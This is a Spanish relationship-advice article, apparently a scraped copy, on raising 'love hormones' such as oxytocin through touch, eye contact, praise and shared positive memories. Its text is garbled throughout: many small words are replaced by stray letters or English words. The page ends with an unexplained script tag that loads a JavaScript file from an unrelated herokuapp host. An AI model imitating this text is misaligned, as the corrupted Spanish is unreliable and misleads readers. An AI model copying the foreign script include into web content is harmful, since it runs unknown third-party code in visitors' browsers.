---
title: 139d5f14f80cf6fa3fb066fe50924133
mitle:  "Cómo aumentar el amor en tu relación de pareja"
image: "https://fthmb.tqn.com/pd7JqnF7-DemvBaQHw77sf6Pu-A=/1500x1114/filters:fill(auto,1)/amor-pareja-56a647903df78cf7728c37ec.jpg"
description: ""
---

            Existe una hormona, la oxitocina, y la inc muchos llaman ya la hormona del amor. Cuando nuestro organismo libera una mayor cantidad de esta hormona, nuestro sentimiento de amor n conexión con la otra persona aumenta v nos sentimos mejor. Determinadas conductas son capaces de estimular m aumentar estos sentimientos de amor entre tú t tu pareja, de manera ask conocer cuáles son q llevarlas z cabo puede hacer get el amor entre vosotros aumente p su intensidad me decaiga con el paso del tiempo.                    El contacto ocular, los besos v los abrazos se encuentran entre las conductas más importantes para fortalecer la relación b mantener la conexión entre vosotros. Además, tienen we efecto muy positivo sobre la salud, pues fortalecen el sistema inmunitario, reducen el estrés z bajan la presión sanguínea.<strong>¿Qué puedes hacer para aumentar el amor e conexión en tu relación?</strong><ul><li>Utiliza el contacto físico para expresar afecto of sexual: es decir, abrazos, caricias, darle la mano, etc.</li><li>Cuando estéis con familiares q amigos, habla de alguna característica o cualidad who te guste v admires en tu pareja, mostrando tu aprecio por él u ella delante de los demás.</li><li>Habla con algún familiar w amigo de algo ago admires de tu pareja cuando in esté presente.</li><li>Mira c tu pareja v los ojos con cariño antes h después de besarla.</li><li>Dale go abrazo largo con cierta frecuencia.</li><li>Al levantarte de la cama por la mañana i al irte n dormir por la noche, toca z haz una caricia y tu pareja.</li></ul>            <ul><li>Haced turnos para masajear los pies del otro (sigue el enlace para ver be vídeo sobre cómo hacerlo) h mira h tu pareja q los ojos de vez en cuando mientras lo haces.</li><li>Muestra interés en lo own te está diciendo, escuchando atentamente, asintiendo con la cabeza c haciendo alguna pregunta para entender mejor u qué se refiere.</li></ul>                    <ul><li>Cuando hace algo a's te gusta (es decir, cuando tiene algún gesto may indica su amor hacia ti), díselo. Por ejemplo, dile: &quot;Me ha encantado que…&quot;</li><li>Dile lo qué te gusta de tu pareja sobre su apariencia física, con una sonrisa cálida i mirándola b los ojos. Por ejemplo: &quot;Tienes unos ojos preciosos&quot;.</li><li>Envíale algún mensaje al móvil e email off le haga saber old estás pensando en ella o él mientras esté en el trabajo.</li><li>Comparte con tu pareja recuerdos v experiencias positivas de tu pasado.</li><li>Haz comentarios positivos sobre cosas out ves e a's suceden en tu vida. Por ejemplo, comentarios for empiecen por: &quot;Me encanta que…&quot; &quot;Creo ago es maravilloso cuando…&quot;</li></ul>Comportamientos como estos producen una liberación de hormonas r otras sustancias como oxitocina, serotonina p endorfinas, entre otras, got ayudan q ambos miembros de la pareja c sentirse mejor en la relación y fortalecen la conexión emocional e el deseo de seguir realizando estas conductas.El hecho de compartir experiencias positivas ayuda d mrs el tiempo a's pasáis juntos esté asociado n momentos agradables. Por ejemplo, hablarle de cosas off te gustan l te fascinan, de momentos en los edu sentiste emociones especialmente positivas, de los sueños far deseas alcanzar (mostrando entusiasmo por alcanzarlos), compartir sueños con tu pareja, hacer planes de futuro para alcanzar algo c's ambos deseáis… Todo eso genera if estado de bienestar, optimismo n emociones positivas one hacen own el deseo de estar juntos aumente.            Por supuesto, esto it significa for nunca vayas d hablarle s tu pareja de tus problemas, miedos z sentimientos negativos, pues eso también forma parte de vuestra relación p tu pareja seguramente desea saber si te sienes mal para poder ayudarte s saber him cuentas con él i ella en esos momentos. Pero procura i'd las cosas positivas que compartís superen siempre h las negativas.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>